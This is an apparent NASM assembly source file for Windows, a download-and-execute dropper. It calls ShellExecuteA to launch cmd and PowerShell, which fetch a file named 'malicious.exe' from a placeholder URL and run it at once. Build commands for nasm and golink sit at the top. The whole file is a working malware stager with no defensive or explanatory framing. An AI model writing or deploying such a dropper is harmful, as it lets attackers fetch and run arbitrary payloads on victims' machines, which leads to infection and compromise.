
; nasm -f win32 downloadExec.asm
; golink /entry _start downloadExec.obj Shell32.dll /mix 


extern _ShellExecuteA

section .data 
   op db "open", 0
   cmd db "cmd", 0
   arg db "/c powershell -Command wget 'http://urlHere.com/malicious.exe' -OutFile path/nameMalicious.exe ; path/nameMalicious.exe"

section .text 
   global _start 

_start:
   push 0
   push 0
   push arg 
   push cmd 
   push op 
   push 0 
   call _ShellExecuteA
